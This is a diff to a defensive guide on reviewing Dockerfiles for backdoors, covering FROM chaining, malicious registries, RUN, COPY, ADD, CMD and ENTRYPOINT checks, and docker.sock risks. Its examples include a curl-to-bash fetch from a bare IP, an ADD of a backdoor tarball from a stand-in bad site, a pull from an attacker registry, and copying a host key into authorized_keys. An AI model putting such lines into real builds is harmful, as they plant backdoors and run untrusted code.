@@ -50,7 +50,7 @@ Usually one of the top most statements of a `Dockerfile`.  It is used to instruc
 
 In general it is always a good idea to look for the `FROM` statements and trace them back on docker hub to see if they use official images or not. Some of the  tricks that can be found in `FROM` statements follows.
 
-### `FROM` Chaining
+#### `FROM` Chaining
 Another trick that I've seen be used is what I call the _FROM chaining_. This is for images that depend on another, that in turn depend on other etc. etc. All the images seem clean but somewhere in the midst of all those images there's the one that adds the backdoored bash or whatever.
 
 
@@ -72,27 +72,77 @@ One of the things that `docker` will do for you is to parse as URL the image nam
 FROM badregistry.attacker.io/repo/backdoor:latest
 ```
 
-Upon building this image docker will connect to `badregistry.attacker.io:443` and attempt to fetch the image `repo/backdoor`
+Upon building this image docker will connect to `badregistry.attacker.io` and attempt to fetch the image `repo/backdoor` and use this as a base for the container.
 
 
 
 #### Unicode `FROM` image
+This is mostly theoretical to be honest as docker fails to to use any image with non basic ascii characters. However, I have not researched this extensively, so using some unicode characters may still be possible.
 
-Pay close attention at the FROM image names as Unicode characters can be used to make it look like it came from a legit repository.
+It is here mostly for completeness (or in case i want to research this again in the future).
 
 * [IDN homograph attack](https://en.wikipedia.org/wiki/IDN_homograph_attack)
 * [Unicode Bidirectional Text Spoofing](http://unicode.org/reports/tr36/tr36-8.html#Bidirectional_Text_Spoofing)
 
 ### The RUN statement
+Before i use a container i like to examine the what it runs on build time. I usually trace the all the `RUN` statements from the `Dockerfile`. Check for any out-of-ordinary commands being executed, any downloads that shouldn't be there etc.
 
-## The COPY/ADD statement
-Pay close attention to `COPY` commands and more specificaly the `COPY --from=<name|index>`. Remember the multi-stage builds from above? This is where the COPY command may come in handy.
+I've seen a fair amount of the following attempt to download "backdoored" binaries in `Dockerfiles`.
+```
+RUN curl -sL https://IP/setup_14.x | bash -
+```
+
+Make sure that the image you're building, downloads files from official sources and pay attention at commands that redirect or pipe their output.
+
+### The COPY/ADD statement
+Pay close attention to `COPY` commands and more specificaly the
+`COPY --from=<name|index>`.
+
+Remember the multi-stage builds from above? This is where the COPY command may
+come in handy.
+```sh
+FROM debian #index 0
+...
+FROM redhat #index 1
+...
+FROM backdoor #index 2
+...
+FROM debian #index 3
+...
+# Makes it hard to track what index each image has
+COPY --from=2 /etc/sshd/ssh_host_key ~/.ssh/authorized_keys
+```
+
+Another statement is `ADD` that performs very similar tasks as `COPY` does but
+with a few twists. One of them is the ability to fetch files from the network
+to be added to the image.
+
+```sh
+ADD https://some.bad.site/backdoor.tgz /tmp
+RUN tar zxf /tmp/backdoor.tgz -C /
+```
 
 ### The CMD statement
+This defines the default command to be passed to the `ENTRYPOINT` when the
+image is run. I make sure the default command looks ok and if it refers to a
+script, i inspect its contents to try and figure out what it does.
+
+```sh
+CMD ["/bin/ba.sh"]
+```
+
+You can also inspect the command used by using the docker command, such as
+```sh
+docker image inspect badimage:lastest|grep -i cmd
+```
 
 ### The ENTRYPOINT statement
+The `ENTRYPOINT` defines the `init` for the image. The command from `CMD` is passed to this.
 
-## The entrypoint.sh script
+I always inspect the `ENTRYPOINT` entries and their contents.
+```sh
+ENTRYPOINT ["/something-that-looks-or-has-suspicious-contents.sh"]
+```
 
 ## Package manager repos
 Pay attention at what package managers the container uses and ensure there are no bad repos in there.
@@ -126,7 +176,7 @@ Maps docker volumes, a volume can be any file or directory. Pay attention at wha
 Keep in mind that the existence of these parameters do not mean that an image is malicious. Many containers require these options to operate properly, apply common logic when you see these.
 
 Pay attention when images
-* require access to `docker.sock`, this is almost never a good idea. This allows full control of the host `dockerd`, is as if you're giving root access to your server
+* require access to `docker.sock`, this is almost never a good idea. This allows full control of the host `dockerd`, is as if you're giving root access to your server.
 * variables with typos used for volumes (eg `$PWR` instead of `$PWD`). The shell will not complain and in some cases its not easy to spot.
 
 ```sh
